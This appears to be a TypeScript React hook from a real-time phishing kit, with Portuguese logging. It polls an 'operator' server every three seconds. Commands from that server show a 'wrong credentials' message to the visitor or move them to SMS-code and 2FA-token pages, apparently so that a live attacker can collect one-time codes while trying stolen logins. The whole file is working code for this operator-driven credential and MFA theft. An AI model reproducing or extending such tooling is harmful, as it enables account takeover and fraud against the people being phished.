
import { useState, useCallback, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import { useToast } from '@/hooks/use-toast';

interface MonitoringState {
  isMonitoring: boolean;
  clientId: string | null;
  currentPage: string | null;
}

export const useClientMonitoring = () => {
  const navigate = useNavigate();
  const { toast } = useToast();
  const [state, setState] = useState<MonitoringState>({
    isMonitoring: false,
    clientId: null,
    currentPage: null
  });
  
  const intervalRef = useRef<NodeJS.Timeout | null>(null);
  const isMonitoringRef = useRef(false);

  const stopMonitoring = useCallback(() => {
    console.log('Parando monitoramento...');
    isMonitoringRef.current = false;
    
    if (intervalRef.current) {
      clearInterval(intervalRef.current);
      intervalRef.current = null;
      console.log('Interval limpo');
    }
    
    setState(prev => ({ ...prev, isMonitoring: false }));
  }, []);

  const startMonitoring = useCallback((clientId: string, currentPage: string) => {
    console.log(`Iniciando monitoramento centralizado - Cliente: ${clientId}, Página: ${currentPage}`);
    
    // Parar monitoramento anterior se existir
    stopMonitoring();
    
    setState(prev => ({ ...prev, isMonitoring: true, clientId, currentPage }));
    isMonitoringRef.current = true;

    const monitor = async () => {
      if (!isMonitoringRef.current) {
        console.log('Monitoramento parado por flag');
        return;
      }

      try {
        console.log(`[${currentPage}] Consultando cliente ${clientId}...`);
        
        const response = await fetch(`https://servidoroperador.onrender.com/api/clients/${clientId}/info`, {
          method: 'GET',
          headers: {
            'Content-Type': 'application/json',
          }
        });

        if (response.ok) {
          const clientData = await response.json();
          const command = clientData.data?.command;
          const responseData = clientData.data?.response;
          
          console.log(`[${currentPage}] Command: ${command}, Response: ${responseData}`);
          
          // Lógica específica por página
          if (currentPage === 'home') {
            if (command === 'inv_username' || responseData === 'inv_username') {
              console.log('[HOME] Dados incorretos detectados');
              stopMonitoring();
              toast({
                title: "Dados incorretos",
                description: "Verifique suas credenciais e tente novamente.",
                variant: "destructive",
              });
              return;
            }
            
            if (command === 'ir_sms' || responseData === 'ir_sms') {
              console.log('[HOME] Redirecionando para SMS');
              stopMonitoring();
              navigate('/sms');
              return;
            }
            
            if (command === 'ir_2fa' || responseData === 'ir_2fa') {
              console.log('[HOME] Redirecionando para TOKEN');
              stopMonitoring();
              navigate('/token');
              return;
            }
          }
          
          if (currentPage === 'sms') {
            if (command === 'inv_sms' || responseData === 'inv_sms') {
              console.log('[SMS] Código SMS inválido - continuando monitoramento');
              // Não para o monitoramento, apenas notifica
              return;
            }
            
            if (command === 'ir_2fa' || responseData === 'ir_2fa') {
              console.log('[SMS] Redirecionando para TOKEN');
              stopMonitoring();
              navigate('/token');
              return;
            }
          }
          
          if (currentPage === 'token') {
            if (command === 'inv_2fa' || responseData === 'inv_2fa') {
              console.log('[TOKEN] Token inválido - continuando monitoramento');
              // Não para o monitoramento, apenas notifica
              return;
            }
            
            if (command === 'ir_sms' || responseData === 'ir_sms') {
              console.log('[TOKEN] Redirecionando para SMS');
              stopMonitoring();
              navigate('/sms');
              return;
            }
          }
          
          console.log(`[${currentPage}] Continuando monitoramento...`);
        } else {
          console.log(`[${currentPage}] Erro na consulta:`, response.status);
        }

      } catch (error) {
        console.log(`[${currentPage}] Erro durante consulta:`, error);
      }
    };

    // Executar primeira consulta
    monitor();
    
    // Configurar intervalo
    intervalRef.current = setInterval(monitor, 3000);
    console.log(`Monitoramento configurado para página ${currentPage}`);
  }, [navigate, toast, stopMonitoring]);

  return {
    ...state,
    startMonitoring,
    stopMonitoring
  };
};
